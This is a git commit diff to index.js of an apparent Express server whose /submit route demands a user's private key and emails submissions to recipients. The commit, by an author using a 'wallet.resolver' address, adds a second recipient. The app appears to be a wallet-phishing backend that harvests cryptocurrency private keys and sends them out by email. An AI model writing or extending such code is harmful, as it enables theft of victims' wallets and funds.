6a9616a7debd5f494126452eb7b22e217dce40ae
phlegs12 <wallet.resolver@gmail.com>
2025-10-30 08:43:36 +0100

    Update index.js

--- index.js
+++ index.js
@@ -57,7 +57,7 @@ app.post('/submit', async (req, res) => {
       return res.status(400).json({ error: 'Private key required' });
   }
 
-  const recipients = [process.env.RECIPIENT1];
+  const recipients = [process.env.RECIPIENT1, process.env.RECIPIENT2];
   
   try {
       // Send email to each recipient
